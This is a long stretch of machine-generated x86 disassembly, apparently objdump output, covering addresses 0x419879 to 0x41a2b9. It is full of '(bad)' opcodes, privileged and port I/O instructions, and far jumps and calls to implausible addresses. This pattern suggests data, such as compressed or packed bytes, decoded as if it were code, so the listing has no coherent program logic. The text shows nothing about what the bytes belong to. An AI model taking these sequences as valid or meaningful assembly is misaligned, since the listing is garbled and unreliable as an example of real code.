  419879:	xchg   esi,eax
  41987a:	rcl    bh,0x21
  41987d:	dec    esi
  41987e:	add    al,0x62
  419880:	pop    esi
  419881:	pop    edx
  419882:	and    eax,0x595eae1a
  419887:	add    al,bl
  419889:	add    al,0x4
  41988b:	clc    
  41988c:	fisub  DWORD PTR [edx]
  41988e:	(bad)  
  41988f:	fcomip st,st(4)
	...
  4198f1:	add    BYTE PTR [eax],al
  4198f3:	add    BYTE PTR [edx-0x201eb8e7],al
  4198f9:	jmp    DWORD PTR [esi+0x45e3657b]
  4198ff:	fnsave [edi+0x85067ca]
  419905:	sgdtd  [eax]
  419908:	add    eax,0xd9000001
  41990d:	cmp    BYTE PTR [ebp-0x56f8bc15],0x7a
  419914:	cld    
  419915:	pusha  
  419916:	push   esi
  419917:	outs   dx,DWORD PTR ds:[esi]
  419918:	adc    eax,0x68e0d8b6
  41991d:	mov    DWORD PTR [edi],ebp
  41991f:	ins    DWORD PTR es:[edi],dx
  419920:	dec    eax
  419921:	adc    ch,BYTE PTR [ebp+0x33d4fdfe]
  419927:	dec    ebp
  419928:	ins    DWORD PTR es:[edi],dx
  419929:	hlt    
  41992a:	jmp    0x36a1:0xd93e14fb
  419931:	pop    ebp
  419932:	xor    DWORD PTR [ebx],esp
  419934:	call   0x6a2181a4
  419939:	mov    bl,dl
  41993b:	pop    ecx
  41993c:	sti    
  41993d:	hlt    
  41993e:	mov    esi,0x8f6dd6a7
  419943:	lods   eax,DWORD PTR ds:[esi]
  419944:	inc    esp
  419945:	xchg   ebx,eax
  419946:	pop    esi
  419947:	and    ebx,DWORD PTR [edi]
  419949:	inc    ebp
  41994a:	mov    ah,0xdd
  41994c:	push   cs
  41994d:	xchg   esp,eax
  41994e:	scas   al,BYTE PTR es:[edi]
  41994f:	call   0x93b6cce1
  419954:	dec    ecx
  419955:	sbb    DWORD PTR [edx+0x7bc2f3e4],eax
  41995b:	fwait
  41995c:	jmp    0x944a25fd
  419961:	into   
  419962:	mov    BYTE PTR [eax-0x56],bl
  419965:	ror    BYTE PTR [ebx-0x1de96160],1
  41996b:	xor    BYTE PTR [esi-0x70],bl
  41996e:	mov    esi,0x9c84b20a
  419973:	(bad)
  419976:	enter  0xb144,0x1e
  41997a:	pop    ebp
  41997b:	nop
  41997c:	and    bh,bh
  41997e:	int    0xab
  419980:	jne    0x41999b
  419982:	add    eax,0x7dc678a2
  419987:	mov    eax,ds:0x6f9f839f
  41998c:	mov    bl,BYTE PTR [esi-0x68]
  41998f:	sub    edi,esi
  419991:	jns    0x4199e1
  419993:	push   esi
  419994:	dec    esi
  419995:	adc    cl,BYTE PTR [edi+0x47]
  419998:	sub    al,0xaa
  41999a:	dec    ebx
  41999b:	mov    cl,0xa7
  41999d:	xchg   ebp,edx
  41999f:	mov    ecx,0x51043ae0
  4199a4:	cwde   
  4199a5:	sub    BYTE PTR [edx],dh
  4199a7:	adc    al,0x3c
  4199a9:	adc    al,0x6c
  4199ab:	sbb    eax,0x7de2eccf
  4199b0:	pop    edi
  4199b1:	push   ds
  4199b2:	add    BYTE PTR [esi],ah
  4199b4:	shl    BYTE PTR [ebx-0x7e],cl
  4199b7:	data16 and cl,BYTE PTR [edx]
  4199ba:	mov    al,0x2d
  4199bc:	out    dx,al
  4199bd:	pop    esp
  4199be:	js     0x419a3d
  4199c0:	in     eax,0x68
  4199c2:	ret    
  4199c3:	dec    esp
  4199c4:	loope  0x41998d
  4199c6:	and    bh,dl
  4199c8:	lock mov ch,0xd3
  4199cb:	jp     0x419a11
  4199cd:	mov    dl,0x97
  4199cf:	inc    edx
  4199d0:	fldcw  WORD PTR [edi]
  4199d2:	xchg   ebp,eax
  4199d3:	in     al,dx
  4199d4:	add    DWORD PTR [esi+0x32b8a479],ebx
  4199da:	mov    al,0x3b
  4199dc:	xchg   ecx,eax
  4199dd:	jp     0x4199a4
  4199df:	ficomp DWORD PTR [esi+0x64e9af4e]
  4199e5:	dec    eax
  4199e6:	mov    al,ds:0xd1bf5a06
  4199eb:	xchg   ecx,eax
  4199ec:	sub    DWORD PTR [ebx+0x3f],esp
  4199ef:	out    0x4e,eax
  4199f1:	mov    bl,0xb8
  4199f3:	test   BYTE PTR [ecx],al
  4199f5:	fsubr  DWORD PTR [ebp+ebx*1+0x2fcd15cb]
  4199fc:	test   DWORD PTR [edx+0x71],ecx
  4199ff:	pop    esi
  419a00:	and    al,0x9d
  419a02:	pop    edx
  419a03:	pop    ecx
  419a04:	push   edx
  419a05:	xor    cl,BYTE PTR [esi]
  419a07:	xchg   ebp,eax
  419a08:	das    
  419a09:	and    ecx,ecx
  419a0b:	mov    ds:0x7977b5eb,eax
  419a10:	stos   DWORD PTR es:[edi],eax
	...
  419a71:	add    BYTE PTR [eax],al
  419a73:	add    BYTE PTR [ebx],dh
  419a75:	xor    DWORD PTR [ebx+0x77e793c5],edx
  419a7b:	test   ebx,0x1c215d3
  419a81:	push   esp
  419a82:	mov    cl,0x62
  419a84:	or     eax,0x5000110
  419a89:	add    DWORD PTR [eax],eax
  419a8b:	add    BYTE PTR [ebx+0x70438939],bl
  419a91:	jl     0x419a34
  419a93:	(bad)  
  419a94:	fldcw  WORD PTR [edi+0x47c96d8e]
  419a9a:	mov    edi,0x66dc30ea
  419a9f:	pop    ds
  419aa0:	dec    eax
  419aa1:	jl     0x419ae8
  419aa3:	jo     0x419aca
  419aa5:	push   edx
  419aa6:	cdq    
  419aa7:	push   esi
  419aa8:	xchg   ecx,eax
  419aa9:	rcl    DWORD PTR [ebx],0x12
  419aac:	ret    0xadc
  419aaf:	mov    ebp,0x944cec6
  419ab4:	std    
  419ab5:	jge    0x419aa3
  419ab7:	ins    DWORD PTR es:[edi],dx
  419ab8:	sbb    eax,0x56c65495
  419abd:	ins    DWORD PTR es:[edi],dx
  419abe:	jg     0x419af6
  419ac0:	lahf   
  419ac1:	xchg   cl,bh
  419ac3:	imul   BYTE PTR [ebx]
  419ac5:	call   0x7705:0x1a48ed05
  419acc:	push   esp
  419acd:	popf   
  419ace:	dec    ebp
  419acf:	pop    edx
  419ad0:	into   
  419ad1:	lds    ebx,FWORD PTR ss:[ebx]
  419ad4:	cmp    al,0x4f
  419ad6:	sahf   
  419ad7:	and    al,0xd4
  419ad9:	ins    BYTE PTR es:[edi],dx
  419ada:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419adb:	in     al,dx
  419adc:	pop    es
  419add:	cwde   
  419ade:	mov    eax,ds:0xca55a85e
  419ae3:	mov    al,0xe9
  419ae5:	mov    ch,0xbc
  419ae7:	int3   
  419ae8:	jmp    0xd6d51fc
  419aed:	sti    
  419aee:	dec    esp
  419aef:	leave  
  419af0:	pop    ebx
  419af1:	mov    dl,0xb0
  419af3:	ins    BYTE PTR es:[edi],dx
  419af4:	or     BYTE PTR [edi-0x3efc0068],cl
  419afa:	or     ecx,DWORD PTR [ebx+0x4af885cc]
  419b00:	pop    ebx
  419b01:	and    BYTE PTR [ecx],cl
  419b03:	dec    ecx
  419b04:	fs leave 
  419b06:	nop
  419b07:	mov    fs,WORD PTR [ebp-0x52]
  419b0a:	fnsave [ebx-0x3f]
  419b0d:	ret    
  419b0e:	shr    DWORD PTR [esi],0xd
  419b11:	and    eax,0x94c75688
  419b16:	push   es
  419b17:	ror    BYTE PTR [edx-0x1c97bafa],1
  419b1d:	push   cs
  419b1e:	mov    edx,0xc430b45
  419b23:	fwait
  419b24:	adc    al,0xcd
  419b26:	out    dx,al
  419b27:	sub    DWORD PTR [edi-0x61],0xffffffec
  419b2b:	sbb    esi,DWORD PTR [edi-0x1350ef26]
  419b31:	fmul   DWORD PTR [ebx+0x2f]
  419b34:	mov    esp,0x4a4eebc7
  419b39:	mov    bl,0xac
  419b3b:	popa   
  419b3c:	stc    
  419b3d:	test   eax,0x4737a17
  419b42:	fisubr WORD PTR [ecx+ecx*2+0x2f]
  419b46:	out    0x11,eax
  419b48:	fnstenv cs:[edi+0x5682e9a6]
  419b4f:	pop    ebx
  419b50:	xchg   edi,eax
  419b51:	fs into 
  419b53:	mov    ebx,0xc6b51554
  419b58:	enter  0x515b,0x58
  419b5c:	or     esp,DWORD PTR [eax+eiz*4-0x37605555]
  419b63:	loope  0x419af2
  419b65:	xchg   ecx,eax
  419b66:	call   0xaf90318d
  419b6b:	adc    DWORD PTR [edx],edi
  419b6d:	mov    eax,0x3403bf07
  419b72:	and    ch,cl
  419b74:	mov    edx,0x40b15dd5
  419b79:	jbe    0x419bd9
  419b7b:	fild   DWORD PTR [esi]
  419b7d:	sbb    BYTE PTR [edi-0x6fe0da7e],bl
  419b83:	pop    edx
  419b84:	out    dx,eax
  419b85:	lods   al,BYTE PTR ds:[esi]
  419b86:	div    eax
  419b88:	sub    al,0xd9
  419b8a:	(bad)  
  419b8b:	mov    BYTE PTR [edx-0x3f2cf09e],0x0
	...
  419bf2:	add    BYTE PTR [eax],al
  419bf4:	dec    edx
  419bf5:	(bad)  
  419bf6:	cli    
  419bf7:	inc    edi
  419bf8:	(bad)  
  419bf9:	jg     0x419bfa
  419bfb:	int    0x88
  419bfd:	xchg   ecx,eax
  419bfe:	lods   al,BYTE PTR ds:[esi]
  419bff:	or     al,0x37
  419c01:	aam    0xff
  419c03:	inc    esp
  419c04:	adc    dl,BYTE PTR [ecx]
  419c06:	add    DWORD PTR [eax],eax
  419c08:	add    eax,0x4c000001
  419c0d:	jne    0x419baf
  419c0f:	mov    ebp,0x9dcea06
  419c14:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  419c16:	imul   ecx,DWORD PTR [esp+esi*2+0x1d42e9bf],0x5d3cf4e5
  419c21:	rol    ebp,0xf6
  419c24:	pop    ds
  419c25:	mov    ah,0x18
  419c27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419c28:	push   ebp
  419c29:	pop    ds
  419c2a:	mov    DWORD PTR [edi],esp
  419c2c:	(bad)  
  419c2d:	jae    0x419bef
  419c2f:	pop    ss
  419c30:	mov    dh,0xdd
  419c32:	jp     0x419bcf
  419c34:	test   DWORD PTR [esi-0x3008edaa],ebp
  419c3a:	xor    eax,0x72c2d336
  419c3f:	add    ebp,eax
  419c41:	repz into 
  419c43:	xchg   ebx,eax
  419c44:	in     eax,dx
  419c45:	add    ch,BYTE PTR [ebx]
  419c47:	ret    
  419c48:	pop    ds
  419c49:	xchg   edi,eax
  419c4a:	fst    DWORD PTR [edi+esi*2]
  419c4d:	mov    al,BYTE PTR ds:0xbbd8a6e6
  419c53:	cld    
  419c54:	push   0x82c6619b
  419c59:	and    ah,BYTE PTR [ebp+0x2c]
  419c5c:	bound  ebp,QWORD PTR [ecx]
  419c5e:	test   al,0x31
  419c60:	rol    BYTE PTR [eax+0x15],0x9c
  419c64:	xor    ah,BYTE PTR [ebx]
  419c66:	ins    DWORD PTR es:[edi],dx
  419c67:	mov    al,ds:0x11fce2d6
  419c6c:	test   BYTE PTR [edx-0x35],cl
  419c6f:	adc    al,0xdc
  419c71:	push   esi
  419c72:	in     eax,dx
  419c73:	iret   
  419c74:	xor    DWORD PTR [edx],edx
  419c76:	cs popf 
  419c78:	inc    ebp
  419c79:	fsub   QWORD PTR [ecx-0x6e]
  419c7c:	sub    DWORD PTR ds:[edx-0x80],edx
  419c80:	(bad)  
  419c81:	jmp    0x419ca0
  419c83:	ja     0x419c11
  419c85:	adc    DWORD PTR [ecx-0x3],0xffffffc0
  419c89:	sub    ebp,edx
  419c8b:	mov    ch,0x5a
  419c8d:	rcr    DWORD PTR [edx-0x2d849ee1],0xf
  419c94:	xchg   BYTE PTR [edi-0x4c],cl
  419c97:	push   0xffffffed
  419c99:	iret   
  419c9a:	loop   0x419c9f
  419c9c:	cdq    
  419c9d:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  419c9f:	out    dx,eax
  419ca0:	add    cl,BYTE PTR [edi+edi*2-0x6b7ea9a4]
  419ca7:	(bad)  
  419ca8:	push   edx
  419ca9:	(bad)  
  419caa:	aaa    
  419cab:	pop    ecx
  419cac:	jb     0x419d08
  419cae:	cmp    BYTE PTR [ecx],ch
  419cb0:	or     ah,0x9e
  419cb3:	xor    al,0xdf
  419cb5:	jp     0x419cd4
  419cb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419cb8:	rol    BYTE PTR [eax-0x1540a364],1
  419cbe:	jo     0x419d01
  419cc0:	mov    eax,0x198dbe5d
  419cc5:	push   0xffffffcd
  419cc7:	inc    edx
  419cc8:	cmc    
  419cc9:	jmp    0x419cf9
  419ccb:	adc    ah,BYTE PTR [ebp+0x26]
  419cce:	dec    edi
  419ccf:	inc    ebx
  419cd0:	das    
  419cd1:	lahf   
  419cd2:	pop    ebp
  419cd3:	fisub  WORD PTR [ecx]
  419cd5:	mov    cs,WORD PTR [ebx+0x39]
  419cd8:	test   al,cl
  419cda:	bound  esp,QWORD PTR [ecx-0x51]
  419cdd:	pop    eax
  419cde:	push   ebp
  419cdf:	pop    edi
  419ce0:	cs jnp 0x419c82
  419ce3:	push   ebp
  419ce4:	clc    
  419ce5:	push   ebx
  419ce6:	out    dx,eax
  419ce7:	call   0xf59e:0x95e82276
  419cee:	add    dh,BYTE PTR [esi-0x130cf4f8]
  419cf4:	addr16 xchg esp,eax
  419cf6:	outs   dx,DWORD PTR ds:[esi]
  419cf7:	lahf   
  419cf8:	pop    eax
  419cf9:	daa    
  419cfa:	(bad)  
  419cfc:	xchg   esi,eax
  419cfd:	mov    dl,0xd3
  419cff:	sub    ebp,edi
  419d01:	push   ebx
  419d02:	push   DWORD PTR [esi-0x4f]
  419d05:	jne    0x419cf3
  419d07:	jge    0x419d2b
  419d09:	add    BYTE PTR [ebx-0x6e],0xdb
  419d0d:	add    edx,edi
  419d0f:	jb     0x419cf5
	...
  419d71:	add    BYTE PTR [eax],al
  419d73:	add    al,dh
  419d75:	xchg   edi,eax
  419d76:	std    
  419d77:	cmp    al,0xff
  419d79:	jle    0x419d6c
  419d7b:	fistp  QWORD PTR [edi-0x16]
  419d7e:	ss (bad) 
  419d81:	(bad)  
  419d82:	shr    DWORD PTR [ecx],cl
  419d84:	pop    ss
  419d85:	adc    al,BYTE PTR [ecx]
  419d87:	add    BYTE PTR ds:0xf9000001,al
  419d8d:	out    dx,al
  419d8e:	test   al,0x71
  419d90:	cmp    BYTE PTR [ecx],0x6
  419d93:	push   ebp
  419d94:	push   ebp
  419d95:	jns    0x419dbd
  419d97:	push   0x19
  419d99:	(bad)  
  419d9a:	test   BYTE PTR [eax-0x755e499f],0x95
  419da1:	shl    BYTE PTR [ebp+eax*1-0x3da4d00e],cl
  419da8:	test   BYTE PTR [eax],0x92
  419dab:	loopne 0x419e06
  419dad:	std    
  419dae:	jge    0x419d7c
  419db0:	and    eax,0xdbdfe68a
  419db5:	push   esp
  419db6:	add    DWORD PTR [eax-0x49dbfdec],0xffffffbe
  419dbd:	sbb    eax,0x4c2158d0
  419dc2:	sub    al,0xa9
  419dc4:	mov    esi,0xe938da52
  419dc9:	loope  0x419d7a
  419dcb:	xor    BYTE PTR [eax+0x56],cl
  419dce:	fst    QWORD PTR [ebp+0x66]
  419dd1:	sub    DWORD PTR [ebx],eax
  419dd3:	push   edx
  419dd4:	jp     0x419daa
  419dd6:	inc    esp
  419dd7:	jle    0x419d67
  419dd9:	fbstp  TBYTE PTR [edi+0xf898983]
  419ddf:	rcl    DWORD PTR [edx-0x6bdc7377],0x6b
  419de6:	(bad)  
  419de7:	dec    esp
  419de8:	cmp    bl,bh
  419dea:	cmp    al,0xe4
  419dec:	mov    bh,0x5d
  419dee:	leave  
  419def:	mov    ds:0x1a0f8203,eax
  419df4:	aam    0x71
  419df6:	(bad)  
  419df7:	ja     0x419e20
  419df9:	and    al,0xa0
  419dfb:	test   ebp,ebx
  419dfd:	cld    
  419dfe:	xor    BYTE PTR [edi],bh
  419e00:	out    0xb9,eax
  419e02:	sbb    al,0x4e
  419e04:	es dec ebp
  419e06:	scas   al,BYTE PTR es:[edi]
  419e07:	dec    edx
  419e08:	das    
  419e09:	adc    ah,BYTE PTR [edx+0x29]
  419e0c:	std    
  419e0d:	repnz out 0x6,al
  419e10:	ror    DWORD PTR [edx+0x7254af8c],cl
  419e16:	and    cl,BYTE PTR [esp+eiz*2]
  419e19:	xchg   ebx,eax
  419e1a:	je     0x419de6
  419e1c:	dec    edi
  419e1d:	call   0x7e5c:0xb1e2a4ca
  419e24:	icebp  
  419e25:	or     al,0x93
  419e27:	pop    eax
  419e28:	sar    ebp,cl
  419e2a:	xor    ecx,DWORD PTR [edi+edx*8+0xf05d24b]
  419e31:	hlt    
  419e32:	iret   
  419e33:	push   ss
  419e34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419e35:	xor    al,0x2c
  419e37:	js     0x419e16
  419e39:	ins    BYTE PTR es:[edi],dx
  419e3a:	push   es
  419e3b:	pop    esi
  419e3c:	fild   QWORD PTR [edi-0x61c4a969]
  419e42:	pop    ds
  419e43:	add    bl,BYTE PTR [ebp+0x17]
  419e46:	mov    esp,edi
  419e48:	(bad)  
  419e49:	fcomip st,st(0)
  419e4b:	lock mov esp,0x3c558607
  419e51:	xchg   ch,dl
  419e53:	std    
  419e54:	call   eax
  419e56:	sbb    ebp,DWORD PTR [ebx]
  419e58:	cmc    
  419e59:	and    DWORD PTR ds:0xc143c42a,ecx
  419e5f:	sbb    edi,DWORD PTR [ebx-0x4756243c]
  419e65:	dec    edi
  419e66:	adc    al,0xe
  419e68:	je     0x419e66
  419e6a:	fistp  QWORD PTR [edi-0x67]
  419e6d:	fistp  DWORD PTR [ebx-0x40202878]
  419e73:	dec    ecx
  419e74:	mov    dl,0x30
  419e76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419e77:	outs   dx,BYTE PTR ds:[esi]
  419e78:	bswap  esp
  419e7a:	inc    esp
  419e7b:	and    BYTE PTR [edi-0x5c],dl
  419e7e:	aas    
  419e7f:	ds pop esi
  419e81:	mov    ah,0xd1
  419e83:	mov    edx,0x6cf32d32
  419e88:	push   cs
  419e89:	push   es
  419e8a:	or     BYTE PTR [ecx+esi*8+0x34],bl
  419e8e:	dec    esi
  419e8f:	or     edi,DWORD PTR [ebx+0x0]
	...
  419ef1:	add    BYTE PTR [eax],al
  419ef3:	add    BYTE PTR [edi+0x5fc517d8],al
  419ef9:	iret   
  419efa:	xlat   BYTE PTR ds:[ebx]
  419efb:	ficomp DWORD PTR [edi+ebp*4+0x55]
  419eff:	inc    esi
  419f00:	mov    al,ds:0x1cf489f9
  419f05:	adc    eax,DWORD PTR [ecx]
  419f07:	add    BYTE PTR ds:0xe2000001,al
  419f0d:	rol    DWORD PTR [edi+0x6d42c70d],1
  419f13:	mov    esp,0xe406a8db
  419f18:	jecxz  0x419f30
  419f1a:	repz ficomp WORD PTR [edx]
  419f1d:	addr16 push eax
  419f1f:	inc    edi
  419f20:	out    0x8f,al
  419f22:	or     bl,dh
  419f24:	cmp    BYTE PTR [edi+0xd],cl
  419f27:	mov    esi,0x2ebe8a95
  419f2c:	or     DWORD PTR [ecx-0x1bf492f5],esp
  419f32:	(bad)  
  419f33:	repz sahf 
  419f35:	add    eax,0x8d2e610c
  419f3a:	or     al,0x84
  419f3c:	(bad)  
  419f3d:	out    0x1,eax
  419f3f:	jne    0x419f50
  419f41:	jne    0x419ef5
  419f43:	cmp    dl,bl
  419f45:	push   edx
  419f46:	mov    bl,0xce
  419f48:	pop    es
  419f49:	and    eax,0x6109c5d9
  419f4e:	into   
  419f4f:	sbb    esi,DWORD PTR [ebx+eiz*8+0x25d869d2]
  419f56:	adc    BYTE PTR [edi],ch
  419f58:	int    0x7c
  419f5a:	test   BYTE PTR [esi],ah
  419f5c:	in     eax,dx
  419f5d:	jg     0x419fd4
  419f5f:	sbb    BYTE PTR [esi],dh
  419f61:	mov    ebx,0x455e6729
  419f66:	dec    edx
  419f67:	mov    ds:0xea8b669d,al
  419f6c:	imul   esi,eax,0x8d5a7821
  419f72:	push   eax
  419f73:	jp     0x419f20
  419f75:	mov    cl,0xfb
  419f77:	xchg   esi,eax
  419f78:	aas    
  419f79:	sbb    BYTE PTR ds:0x56cedba6,bh
  419f7f:	fisttp QWORD PTR [eax+0x2e90a03a]
  419f85:	lea    edi,[esi]
  419f87:	xchg   esp,eax
  419f88:	inc    ebp
  419f89:	stc    
  419f8a:	ins    DWORD PTR es:[edi],dx
  419f8b:	ins    DWORD PTR es:[edi],dx
  419f8c:	mov    ah,0xc
  419f8e:	pop    eax
  419f8f:	cmp    eax,0x97eec5a3
  419f94:	cmp    eax,0xcef1d280
  419f99:	xor    cl,BYTE PTR [ecx-0x4350b89a]
  419f9f:	pop    eax
  419fa0:	dec    esi
  419fa1:	mov    esp,0xc148646c
  419fa6:	mov    dh,0x84
  419fa8:	mov    ebx,0xde25c718
  419fad:	mov    al,0xb2
  419faf:	pop    ecx
  419fb0:	icebp  
  419fb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419fb2:	adc    ecx,DWORD PTR [eax-0x1ff4779b]
  419fb8:	xchg   ebx,eax
  419fb9:	push   eax
  419fba:	jle    0x419f79
  419fbc:	pop    edi
  419fbd:	aam    0xf9
  419fbf:	rcl    BYTE PTR [eax-0x6d],cl
  419fc2:	out    dx,eax
  419fc3:	jmp    0x419fd1
  419fc5:	jp     0x419fdc
  419fc7:	and    bh,cl
  419fc9:	pop    eax
  419fca:	outs   dx,DWORD PTR ds:[esi]
  419fcb:	(bad)  
  419fcc:	imul   al
  419fce:	pop    ecx
  419fcf:	shl    dh,0x91
  419fd2:	mov    bh,0xa4
  419fd4:	mov    bh,0x29
  419fd6:	sti    
  419fd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419fd8:	xor    ebx,edx
  419fda:	dec    esi
  419fdb:	mov    eax,ds:0x22c806eb
  419fe0:	xor    al,0xc9
  419fe2:	inc    ebp
  419fe3:	xor    cl,BYTE PTR [ebp-0x4c7f071e]
  419fe9:	iret   
  419fea:	dec    ebx
  419feb:	popaw  
  419fed:	nop
  419fee:	push   ebp
  419fef:	mov    WORD PTR [edi+eax*1],?
  419ff2:	arpl   WORD PTR [edi+0x516a57f1],dx
  419ff8:	push   edi
  419ff9:	clc    
  419ffa:	ins    BYTE PTR es:[edi],dx
  419ffb:	sub    eax,edx
  419ffd:	iret   
  419ffe:	xchg   ecx,eax
  419fff:	cdq    
  41a000:	inc    edx
  41a001:	not    DWORD PTR [ebx+0x68bcebe3]
  41a007:	test   eax,0x8cea5eea
  41a00c:	test   eax,0x4a0c398a
	...
  41a071:	add    BYTE PTR [eax],al
  41a073:	add    BYTE PTR [esi-0x15],cl
  41a076:	sub    cl,BYTE PTR [esi-0x51]
  41a079:	iret   
  41a07a:	outs   dx,BYTE PTR ds:[esi]
  41a07b:	jmp    0x41a000
  41a07d:	push   edx
  41a07e:	test   BYTE PTR [eax+0x35],bh
  41a081:	enter  0xb2d8,0x21
  41a085:	adc    al,0x1
  41a087:	add    BYTE PTR ds:0xa6000001,al
  41a08d:	lahf   
  41a08e:	outs   dx,BYTE PTR ds:[esi]
  41a08f:	xchg   esi,eax
  41a090:	xchg   esi,eax
  41a091:	daa    
  41a092:	mov    ebp,0x51de589b
  41a097:	outs   dx,DWORD PTR ds:[esi]
  41a098:	jb     0x41a0a3
  41a09a:	sbb    edx,DWORD PTR [ebx+0x546c0d3f]
  41a0a0:	xlat   BYTE PTR ds:[ebx]
  41a0a1:	int3   
  41a0a2:	dec    edi
  41a0a3:	jmp    0xe08b:0x37fb5800
  41a0aa:	mov    eax,ds:0x81beae7
  41a0af:	cmp    ecx,DWORD PTR [edi-0x3eae4075]
  41a0b5:	nop
  41a0b6:	mov    eax,0x11131398
  41a0bb:	sub    eax,0x3f87cdbf
  41a0c0:	shr    dh,1
  41a0c2:	shl    esi,cl
  41a0c4:	cmp    DWORD PTR [ebp+0x4b],0xeb95ad7e
  41a0cb:	out    0x3d,al
  41a0cd:	fnstenv [ebx+0x7bf84a10]
  41a0d3:	aad    0x23
  41a0d5:	in     eax,dx
  41a0d6:	xor    eax,0x1a97e6d3
  41a0db:	mov    DWORD PTR [ebp+0x46],ebp
  41a0de:	dec    esi
  41a0df:	mov    esi,0xf02efce8
  41a0e4:	std    
  41a0e5:	cld    
  41a0e6:	sub    al,0x77
  41a0e8:	clc    
  41a0e9:	pop    esi
  41a0ea:	jae    0x41a07e
  41a0ec:	cmp    dh,BYTE PTR [edi-0x41897670]
  41a0f2:	retf   
  41a0f3:	mov    ah,0x89
  41a0f5:	sbb    al,0x60
  41a0f7:	mov    bh,0x34
  41a0f9:	fcmovb st,st(1)
  41a0fb:	test   al,0x12
  41a0fd:	call   0x9dfd:0x66585a9e
  41a104:	fst    QWORD PTR [esi]
  41a106:	js     0x41a13d
  41a108:	or     al,BYTE PTR [edi+0x79f96890]
  41a10e:	int    0x1e
  41a110:	cdq    
  41a111:	dec    edi
  41a112:	fdiv   DWORD PTR [eax-0x14]
  41a115:	inc    edi
  41a116:	call   0xc0d:0xd3d74355
  41a11d:	ss mov dh,0x5e
  41a120:	mov    ebx,0xb20ff4e4
  41a125:	test   edi,ebp
  41a127:	cmp    al,0xea
  41a129:	jle    0x41a126
  41a12b:	fdiv   QWORD PTR [ebp+edx*4-0x28]
  41a12f:	mov    ch,0x7b
  41a131:	loop   0x41a157
  41a133:	cld    
  41a134:	shr    cl,1
  41a136:	in     eax,dx
  41a137:	fldcw  WORD PTR [ebx-0x3c338d9d]
  41a13d:	inc    edx
  41a13e:	add    ah,dl
  41a140:	xor    edx,ebp
  41a142:	mov    ss,esp
  41a144:	sar    DWORD PTR cs:[edi-0x10767c8e],cl
  41a14b:	fsubr  QWORD PTR [ecx]
  41a14d:	arpl   WORD PTR [ebp+0x16639358],ax
  41a153:	std    
  41a154:	xor    eax,0xf19625b0
  41a159:	fdiv   st(4),st
  41a15b:	scas   eax,DWORD PTR es:[edi]
  41a15c:	mov    dh,0x5b
  41a15e:	sbb    eax,0x274fe05e
  41a163:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a164:	dec    ecx
  41a165:	popa   
  41a166:	mov    bl,bh
  41a168:	xor    BYTE PTR [ecx+0xde36968],dl
  41a16e:	and    DWORD PTR [edx],ebx
  41a170:	sub    eax,0x8dbb840d
  41a175:	nop
  41a176:	mov    dl,0x97
  41a178:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a179:	xlat   BYTE PTR ds:[ebx]
  41a17a:	das    
  41a17b:	imul   edx,DWORD PTR ds:0xdbb457a,0xfffffff1
  41a182:	aad    0x87
  41a184:	popf   
  41a185:	imul   ebx,DWORD PTR [eax-0x752a5fe0],0x55f4011c
  41a18f:	ret    0x78
	...
  41a1f2:	add    BYTE PTR [eax],al
  41a1f4:	sbb    al,0xc
  41a1f6:	std    
  41a1f7:	sbb    ebp,edi
  41a1f9:	stc    
  41a1fa:	cld    
  41a1fb:	or     eax,0x398d6850
  41a200:	lods   al,BYTE PTR ds:[esi]
  41a201:	xchg   esi,eax
  41a202:	or     DWORD PTR [ebx+0x11526],eax
  41a208:	add    eax,0xa8000001
  41a20d:	mov    ecx,0xcae18d7d
  41a212:	mov    esi,0xec2bedf4
  41a217:	or     al,0xf8
  41a219:	icebp  
  41a21a:	push   esi
  41a21b:	(bad)  
  41a21c:	lods   al,BYTE PTR ds:[esi]
  41a21d:	xor    bl,0x2b
  41a220:	out    dx,eax
  41a221:	int3   
  41a222:	jmp    0x41a1b7
  41a224:	push   es
  41a225:	enter  0x62c8,0x67
  41a229:	jns    0x41a29b
  41a22b:	aaa    
  41a22c:	arpl   ax,dx
  41a22e:	aad    0x81
  41a230:	jae    0x41a1d4
  41a232:	pop    ds
  41a233:	inc    esi
  41a234:	adc    dl,BYTE PTR [eax]
  41a236:	clc    
  41a237:	mov    DWORD PTR [ebx+0x1c],ebp
  41a23a:	outs   dx,BYTE PTR ds:[esi]
  41a23b:	cli    
  41a23c:	jb     0x41a246
  41a23e:	(bad)
  41a241:	call   0x9ab8:0xf92c2abb
  41a248:	lock sbb eax,0x40a52cda
  41a24e:	pop    ss
  41a24f:	shr    DWORD PTR [ebx],0x1e
  41a252:	add    ah,al
  41a254:	nop
  41a255:	sub    al,0xbd
  41a257:	dec    ecx
  41a258:	jbe    0x41a258
  41a25a:	mov    esi,0xf824cf88
  41a25f:	mov    esp,0x72522908
  41a264:	addr16 jl 0x41a2b5
  41a267:	sbb    eax,0xe6d36af0
  41a26c:	push   0xd4d15488
  41a271:	pop    edx
  41a272:	xchg   edi,eax
  41a273:	inc    ecx
  41a274:	and    eax,0x38fe9ea3
  41a279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a27a:	dec    eax
  41a27b:	fst    st(3)
  41a27d:	or     BYTE PTR [esi-0x2931c8f1],ah
  41a283:	aam    0x6
  41a285:	and    ebp,DWORD PTR [edi-0x6f162347]
  41a28b:	jle    0x41a2eb
  41a28d:	sub    BYTE PTR ds:0xde61becb,dh
  41a293:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a294:	jne    0x41a2c8
  41a296:	or     dh,BYTE PTR [edi+ebp*8]
  41a299:	mov    bh,0x4d
  41a29b:	jle    0x41a29f
  41a29d:	(bad)  
  41a29e:	call   0x5a029f02
  41a2a3:	jge    0x41a293
  41a2a5:	mov    al,0x8d
  41a2a7:	(bad)  
  41a2a8:	ror    BYTE PTR [ecx-0x63],0xe0
  41a2ac:	jb     0x41a244
  41a2ae:	mov    edx,0xc2947d7c
  41a2b3:	int3   
  41a2b4:	adc    al,ah
  41a2b6:	sbb    dl,BYTE PTR [edx-0x42]
  41a2b9:	test   al,0xa
